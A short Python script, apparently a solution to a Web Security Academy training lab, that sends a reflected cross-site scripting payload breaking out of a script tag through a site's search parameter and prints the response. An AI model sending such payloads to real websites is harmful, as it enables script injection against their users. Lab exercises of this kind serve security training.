import requests

s = requests.Session()

site = 'ac4f1f6e1e06326cc0381d2f008300b7.web-security-academy.net'

payload = '</script><script>alert(1)</script>'

search_url = f'https://{site}/?search={payload}'

resp = s.get(search_url)
print (resp)